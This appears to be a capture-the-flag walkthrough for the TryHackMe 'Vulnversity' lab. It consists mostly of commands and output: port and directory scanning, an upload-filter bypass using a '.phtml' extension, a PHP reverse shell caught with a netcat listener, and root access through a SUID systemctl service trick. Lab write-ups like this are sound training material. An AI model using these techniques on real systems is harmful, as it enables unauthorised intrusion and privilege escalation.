@@ -1,0 +1,109 @@
+RECONNAISSANCE
+
+nmap -sV 10.10.144.71
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+ENUMERATION
+gobuster -u http://10.10.144.71:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.144.71:3333/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,200,204,301
+=====================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/internal (Status: 301)
+
+Use Burp Suite to find accepted file upload extensions
+http://10.10.144.71:3333/internal/
+
+-Create wordlist and upload
+.php
+.php3
+.php4
+.phtml
+
+Send to Sniper in Burpsuite and check results for checks with each extension
+.phtml is the one that works
+
+
+EXPLOITATION
+
+Change IP address
+vim php-reverse-shell.php 
+
+root@kali:~/tryhackme/vulnuniversity# cp php-reverse-shell.php php-reverse-shell.phtml
+root@kali:~/tryhackme/vulnuniversity# nc -lvnp 1234
+listening on [any] 1234 ...
+
+Browse To:
+10.10.144.71:3333/internal/uploads/php-reverse-shell.phtml
+
+connect to [10.11.10.169] from (UNKNOWN) [10.10.144.71] 46734
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 16:34:45 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cat /home/bill/user.txt 
+
+PRIVILEGE ESCALTAION
+$ find / -user root -perm 4000 -exec ls -ldb {} \;
+
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
+
+Exploit SUID Bit Set In SYSTEMCTL
+https://gtfobins.github.io/gtfobins/systemctl/
+
+eop=$(mktemp).service
+$ echo '[Service]
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $eop
+$ /bin/systemctl link $eop
+Created symlink from /etc/systemd/system/tmp.Cqb4SxBaDk.service to /tmp/tmp.Cqb4SxBaDk.service.
+$ /bin/systemctl enable --now $eop
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.Cqb4SxBaDk.service to /tmp/tmp.Cqb4SxBaDk.service.
+$ cd /tmp
+$ ls -la
+total 44
+drwxrwxrwt  8 root     root     4096 Oct 15 17:08 .
+drwxr-xr-x 23 root     root     4096 Jul 31  2019 ..
+drwxrwxrwt  2 root     root     4096 Oct 15 15:31 .ICE-unix
+drwxrwxrwt  2 root     root     4096 Oct 15 15:31 .Test-unix
+drwxrwxrwt  2 root     root     4096 Oct 15 15:31 .X11-unix
+drwxrwxrwt  2 root     root     4096 Oct 15 15:31 .XIM-unix
+drwxrwxrwt  2 root     root     4096 Oct 15 15:31 .font-unix
+-rw-r--r--  1 root     root       33 Oct 15 17:08 output
+drwx------  3 root     root     4096 Oct 15 15:31 systemd-private-36093da7f58740f99fd7764fd217d6f1-systemd-timesyncd.service-Fsi5Zo
+-rw-------  1 www-data www-data    0 Oct 15 17:00 tmp.AAXSvO1iap
+-rw-------  1 www-data www-data    0 Oct 15 17:06 tmp.Cqb4SxBaDk
+-rw-rw-rw-  1 www-data www-data  103 Oct 15 17:07 tmp.Cqb4SxBaDk.service
+-rw-------  1 www-data www-data    0 Oct 15 16:58 tmp.SKtSMzO6aE
+-rw-rw-rw-  1 www-data www-data  100 Oct 15 16:58 tmp.SKtSMzO6aE.service
+$ cat output
